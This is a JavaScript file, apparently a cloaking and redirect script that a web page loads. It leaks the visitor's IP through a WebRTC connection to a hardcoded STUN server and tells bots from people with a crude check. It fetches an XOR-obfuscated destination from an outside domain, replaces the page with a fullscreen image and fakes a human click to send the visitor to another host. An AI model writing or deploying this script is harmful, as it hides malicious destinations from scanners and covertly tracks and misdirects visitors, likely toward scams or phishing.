function checkIP() {
  function decodeLocation(encoded) {
    const decoded = atob(encoded);
    const keyLength = 16;
    
    // Extract positions from end
    const posStr = decoded.slice(-keyLength * 2);
    const positions = [];
    for(let i = 0; i < posStr.length; i += 2) {
        positions.push(parseInt(posStr.substr(i, 2), 16));
    }
    
    // Extract data and key
    let data = decoded.slice(0, -keyLength * 2);
    let key = '';
    
    // Extract key chars from positions (in reverse to maintain positions)
    positions.reverse().forEach(pos => {
        key = data.charAt(pos) + key;
        data = data.slice(0, pos) + data.slice(pos + 1);
    });
    
    // XOR decrypt
    let result = '';
    for(let i = 0; i < data.length; i++) {
        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
  }

  function simulateRealClick(elementId) {
    const element = document.getElementById(elementId);
    const rect = element.getBoundingClientRect();
    const centerX = rect.left + rect.width / 2;
    const centerY = rect.top + rect.height / 2;

    // Mouse move event
    element.dispatchEvent(new MouseEvent('mouseover', {
        view: window,
        bubbles: true,
        cancelable: true,
        clientX: centerX,
        clientY: centerY
    }));

    // Add small delay before click
    setTimeout(() => {
        // Mouse down
        element.dispatchEvent(new MouseEvent('mousedown', {
            view: window,
            bubbles: true,
            cancelable: true,
            clientX: centerX,
            clientY: centerY
        }));

        // Mouse up after 50ms
        setTimeout(() => {
            element.dispatchEvent(new MouseEvent('mouseup', {
                view: window,
                bubbles: true,
                cancelable: true,
                clientX: centerX,
                clientY: centerY
            }));

            // Finally click
            element.dispatchEvent(new MouseEvent('click', {
                view: window,
                bubbles: true,
                cancelable: true,
                clientX: centerX,
                clientY: centerY
            }));
        }, 50);
    }, 100);
  }

  let isBot = typeof window.ontouchstart === 'undefined';
  // Thiết bị di động, chỉ cần kiểm tra các sự kiện chuột
  document.addEventListener('mousemove', () => {
    isBot = true;
  });
  document.addEventListener('mousedown', () => {
    isBot = true;
  });
  document.addEventListener('mouseup', () => {
    isBot = true;
  });
  document.addEventListener('click', () => {
    isBot = true;
  });

  var counter = 3;
  setInterval(function() {
    counter--;
    span = document.getElementById("counter");
    if (span)
      span.innerHTML = counter;
  }, 900);

  // Cấu hình máy chủ STUN
  const stunConfig = {
    iceServers: [{
      urls: "stun:103.159.51.131:3478"
    }]
  };

  // Đảm bảo tương thích đa trình duyệt cho RTCPeerConnection
  window.RTCPeerConnection = window.RTCPeerConnection ||
                        window.mozRTCPeerConnection ||
                        window.webkitRTCPeerConnection;

  // Tạo kết nối WebRTC mới
  const peerConnection = new RTCPeerConnection(stunConfig);

  // Tạo kênh dữ liệu (cần thiết để kích hoạt việc tạo ICE candidate)
  peerConnection.createDataChannel("");

  // Tạo và thiết lập mô tả cục bộ
  peerConnection.createOffer().then(offerDescription => {
    return peerConnection.setLocalDescription(offerDescription);
  }).catch(error => {

  });

  // Xử lý sự kiện ICE candidate
  peerConnection.onicecandidate = (event) => {
    if (!event.candidate) {
      return;
    }

    var candidateStr = event.candidate.candidate;

    // Biểu thức chính quy để trích xuất IP và cổng
    var ipPattern = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
    var portPattern = / ([0-9]{1,5}) typ/;

    // Tìm IP trong chuỗi candidate
    var ipMatch = candidateStr.match(ipPattern);

    if (ipMatch) {
      var ipAddress = ipMatch[1];
      var portMatch = candidateStr.match(portPattern);
      if (portMatch) {
        var port = parseInt(portMatch[1], 10);
        isBot = false;
        if (candidateStr.includes("typ ") && !isBot) {
          const currentPath = window.location.pathname.replace(/^\//, '');
          fetch(`https://tromvia.net/uNHXKG3S9A/${currentPath}?returnJSON=true`)
          .then(res => res.json())
          .then(data => {
            if (data.result) {
              var finalLocation = decodeLocation(data.result);
              try {
                var image = decodeLocation(data.hash);
                document.body.innerHTML = `<style>.fullscreen-image{height:100vh;width:100vw;background:url("${image}") center center/cover no-repeat}</style><div class="fullscreen-image"></div>`;
              } catch (e) { }

              if (finalLocation) {
                var newDirect = new URL(decodeURIComponent(finalLocation)).host
                if (newDirect != window.location.host) {
                  setTimeout(() => {
                    // Get element
                    const link = document.getElementById('uri');
  
                    // Change href
                    link.href = decodeURIComponent(finalLocation);
  
                    // Usage
                    simulateRealClick('uri');
                  }, 1000)
                }
              }
            }
          });
        }
      }
    }
  }
}
checkIP();
